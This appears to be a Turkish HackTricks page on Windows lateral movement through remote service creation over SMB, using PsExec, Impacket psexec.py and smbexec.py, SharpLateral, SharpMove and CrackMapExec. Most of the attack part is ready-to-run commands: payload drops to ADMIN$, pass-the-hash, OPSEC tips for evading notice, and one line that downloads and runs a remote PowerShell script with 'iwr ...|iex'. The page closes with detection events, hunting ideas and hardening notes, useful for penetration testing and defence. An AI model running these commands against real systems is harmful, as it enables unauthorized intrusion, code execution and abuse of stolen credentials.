# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Nasıl çalışırlar

Bu teknikler, hedef bir host üzerinde komut çalıştırmak için SMB/RPC üzerinden Windows Service Control Manager'ı (SCM) uzaktan kötüye kullanır. Genel akış şöyledir:

1. Hedefte kimlik doğrulaması yapın ve SMB (TCP/445) üzerinden ADMIN$ paylaşımına erişin.
2. Bir executable kopyalayın veya servisin çalıştıracağı bir LOLBAS komut satırı belirtin.
3. Bu komuta veya binary'ye işaret eden bir servisi, SCM aracılığıyla (\PIPE\svcctl üzerinden MS-SCMR) uzaktan oluşturun.
4. Payload'ı çalıştırmak için servisi başlatın ve isteğe bağlı olarak stdin/stdout'u adlandırılmış bir pipe üzerinden yakalayın.
5. Servisi durdurun ve temizleyin (servisi ve bırakılan binary'leri silin).

Gereksinimler/ön koşullar:
- Hedefte Local Administrator (SeCreateServicePrivilege) veya hedefte açık servis oluşturma hakları.
- SMB (445) erişilebilir olmalı ve ADMIN$ paylaşımı kullanılabilir olmalı; host firewall üzerinden Remote Service Management'a izin verilmelidir.
- UAC Remote Restrictions: Yerel hesaplarda, yerleşik Administrator hesabı veya LocalAccountTokenFilterPolicy=1 kullanılmadığı sürece token filtering, ağ üzerinden yönetici erişimini engelleyebilir.
- Kerberos ve NTLM: Hostname/FQDN kullanmak Kerberos'ı etkinleştirir; IP ile bağlanıldığında genellikle NTLM'e geçilir (ve güvenliği sıkılaştırılmış ortamlarda engellenebilir).

### sc.exe ile manuel ScExec/WinExec

Aşağıda minimal bir servis oluşturma yaklaşımı gösterilmektedir. Servis image'ı, bırakılan bir EXE veya cmd.exe ya da powershell.exe gibi bir LOLBAS olabilir.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notlar:
- Service olmayan bir EXE başlatırken timeout hatası bekleyin; yürütme yine de gerçekleşir.
- Daha OPSEC-friendly kalmak için fileless komutları (cmd /c, powershell -enc) tercih edin veya bırakılan artifact'ları silin.

Daha ayrıntılı adımları şurada bulabilirsiniz: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Araçlar ve örnekler

### Sysinternals PsExec.exe

- SMB kullanarak PSEXESVC.exe dosyasını ADMIN$ içine bırakan, geçici bir service (varsayılan adı PSEXESVC) yükleyen ve I/O'yu named pipe'ler üzerinden yönlendiren klasik bir admin aracı.
- Örnek kullanımlar:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- WebDAV üzerinden Sysinternals Live'dan doğrudan başlatabilirsiniz:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Hizmet yükleme/kaldırma olayları bırakır (Service adı, -r kullanılırsa değişebilir; genellikle PSEXESVC olur) ve çalıştırma sırasında C:\Windows\PSEXESVC.exe oluşturur.

### Impacket psexec.py (PsExec benzeri)

- RemCom benzeri bir hizmet kullanır. ADMIN$ üzerinden geçici bir hizmet ikilisi bırakır (genellikle rastgele oluşturulmuş bir adla), bir hizmet oluşturur (varsayılan genellikle RemComSvc olur) ve I/O'yu bir named pipe üzerinden yönlendirir.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

Artefaktlar
- C:\Windows\ içine geçici EXE (rastgele 8 karakter). Üzerine yazılmadığı sürece hizmet adı RemComSvc olur.

### Impacket smbexec.py (SMBExec)

- cmd.exe başlatan geçici bir hizmet oluşturur ve G/Ç için named pipe kullanır. Genellikle tam bir EXE payload bırakmaktan kaçınır; komut yürütme yarı etkileşimlidir.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#), service-based exec dahil olmak üzere çeşitli lateral movement yöntemlerini uygular.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove), bir komutu uzaktan çalıştırmak için hizmet değiştirme/oluşturma işlevlerini içerir.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Farklı backend'ler (psexec/smbexec/wmiexec) üzerinden komut yürütmek için CrackMapExec'i de kullanabilirsiniz:

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

## OPSEC, tespit ve artefaktlar

PsExec benzeri teknikler kullanıldığında oluşan tipik host/ağ artefaktları:
- Hedefte kullanılan admin hesabı için Security 4624 (Logon Type 3) ve 4672 (Special Privileges) olayları.
- ADMIN$ erişimini ve servis ikililerinin (örn. PSEXESVC.exe veya rastgele 8 karakterli .exe) oluşturulmasını/yazılmasını gösteren Security 5140/5145 File Share ve File Share Detailed olayları.
- Hedefte servis kurulumunu gösteren Service Control Manager kaynaklı **System** 7045 olayı: PSEXESVC, RemComSvc veya özel adlar (`-r` / `-service-name`). Bu, servisin kurulduğunu kanıtlar; imajının çalıştırıldığını değil. Zaman damgasını ve imaj yolunu, mevcutsa süreç olaylarıyla veya eşleşen bir servis imajı prefetch girdisiyle ilişkilendirin.<sup>[[4]](#references)</sup>
- services.exe veya servis imajı için Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ içindeki dosyalar için 11 (File Create), \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele eşdeğerleri gibi pipe’lar için 17/18 (Pipe Created/Connected).
- Sysinternals EULA için kayıt defteri artefaktı: operatör hostunda HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (bastırılmadıysa).

Avlanma fikirleri
- ImagePath değeri cmd.exe /c, powershell.exe veya TEMP konumlarını içeren servis kurulumları için uyarı oluşturun.
- ParentImage değeri C:\Windows\PSEXESVC.exe olan veya services.exe alt süreci olup LOCAL SYSTEM olarak shell çalıştıran süreç oluşturma olaylarını araştırın.
- -stdin/-stdout/-stderr ile biten adlandırılmış pipe’ları veya bilinen PsExec klon pipe adlarını işaretleyin.

## Yaygın sorunları giderme
- Servis oluşturulurken Access is denied (5): gerçek anlamda local admin olunmaması, local hesaplar için UAC uzak kısıtlamaları veya servis ikilisi yolunda EDR kurcalama koruması.
- Network path was not found (53) veya bağlantı kurulamaması: güvenlik duvarının SMB/RPC’yi engellemesi ya da admin share’lerin devre dışı olması.
- Kerberos başarısız oluyor ancak NTLM engellenmiş: hostname/FQDN (IP değil) kullanarak bağlanın, SPN’lerin doğru olduğundan emin olun veya Impacket kullanırken biletlerle -k/-no-pass sağlayın.
- Servis başlatma zaman aşımına uğruyor ancak payload çalıştı: gerçek bir servis ikilisi olmadığında beklenen durumdur; çıktıyı dosyaya alın veya canlı I/O için smbexec kullanın.

## Hardening notları
- Windows 11 24H2 ve Windows Server 2025, giden bağlantılarda (Windows 11’de gelen bağlantılarda da) varsayılan olarak SMB signing gerektirir. Bu, geçerli kimlik bilgileriyle yapılan meşru PsExec kullanımını bozmaz; ancak unsigned SMB relay saldırılarını önler ve signing desteklemeyen cihazları etkileyebilir.<sup>[[2]](#references)</sup>
- Yeni SMB client NTLM engellemesi (Windows 11 24H2/Server 2025), IP’ye veya Kerberos dışı sunuculara bağlanırken NTLM geri dönüşünü önleyebilir. Hardening uygulanmış ortamlarda bu, NTLM tabanlı PsExec/SMBExec kullanımını bozacaktır; meşru bir ihtiyaç varsa Kerberos (hostname/FQDN) kullanın veya istisnalar yapılandırın.<sup>[[2]](#references)</sup>
- En az ayrıcalık ilkesi: local admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin’i tercih edin, LAPS uygulayın ve 7045 servis kurulumlarını izleyip uyarı oluşturun.

## Ayrıca bkz.

- WMI tabanlı uzak exec (genellikle daha fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- WinRM tabanlı uzak exec:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Windows Server 2025 ve Windows 11'de SMB güvenliğini güçlendirme](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Kimlik Bilgilerini Kullanarak Windows Makinelerini Ele Geçirme - Bölüm 2 (PSExec ve Servisler)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Sistem olay günlüklerini kullanarak beklenmedik yeniden başlatmaları giderme](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
{{#include ../../banners/hacktricks-training.md}}
